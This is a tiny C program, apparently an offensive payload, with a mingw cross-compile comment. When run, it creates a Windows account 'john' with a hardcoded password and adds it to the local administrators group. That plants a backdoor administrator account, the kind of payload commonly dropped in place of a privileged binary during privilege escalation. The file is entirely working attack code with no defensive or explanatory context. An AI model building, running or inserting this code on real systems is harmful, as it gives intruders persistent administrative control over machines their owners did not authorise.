// cross-compile with x86_64-w64-mingw32-gcc win-adduser.c -o win-adduser.exe

#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user john password123! /add");
  i = system ("net localgroup administrators john /add");
  
  return 0;
}